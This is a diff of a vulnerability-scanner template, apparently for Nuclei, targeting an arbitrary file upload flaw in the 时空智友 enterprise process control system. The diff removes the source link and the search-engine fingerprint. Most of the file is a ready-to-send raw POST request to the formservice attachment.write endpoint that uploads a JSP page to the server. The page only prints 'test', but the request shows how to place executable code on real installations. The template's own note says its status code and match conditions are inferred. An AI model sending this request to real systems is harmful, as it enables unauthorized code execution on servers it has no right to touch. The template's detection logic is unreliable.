@@ -3,14 +3,8 @@ info:
   name: 时空智友企业流程化管控系统formserver任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/931499e5ea88e473a18a479ca558ee8a
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 931499e5ea88e473a18a479ca558ee8a
-    fofa: + hunter`web.icon=="2464cbce5dd2681dd4fb62d055520d78"`
 http:
 - raw:
   - "POST /formservice?service=attachment.write&isattach=false&filename=a.jsp HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: JSESSIONID=BDC88B10942C62F82DA953E7503830B2; __qypid=\"\"\nUpgrade-Insecure-Requests: 1\nContent-Length: 229\n\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n<html>\n<head>\n    <title>JSP 输出 test 字符</title>\n\n</head>\n\n<body>\n    <%-- 使用 out 对象输出 test 字符 --%>\n    <%= \"test\" %>\n</body>\n\n</html>"
